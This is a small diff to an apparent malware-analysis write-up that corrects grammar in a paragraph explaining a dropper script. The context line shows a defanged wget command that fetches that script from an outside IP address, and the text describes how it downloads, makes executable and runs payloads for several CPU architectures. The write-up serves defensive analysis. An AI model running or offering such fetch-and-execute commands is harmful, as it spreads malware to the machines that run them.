@@ -72,7 +72,7 @@ wget http://23.94.22[.]13/a/wget.sh
 
 ![wget_sh.png](/.attachments/wget_sh-de81ca11-748b-49d0-ba8f-dc57f28ea875.png)
 
-- Gnarly. What's this thing trying to do? its rather simple. Its using wget to pull down the secondary payload, changing the permissions on it and executing it. It doesn't know the operating CPU so its trying from ARM to x86_64. It tries to install them all. 
+- Gnarly. What's this thing trying to do? It's rather simple. It's using wget to pull down the secondary payload, changing the permissions on it and executing it. It doesn't know the operating CPU so its trying from ARM to x86_64. It tries to install them all. 
 
 ### What's the secondary payload?
 
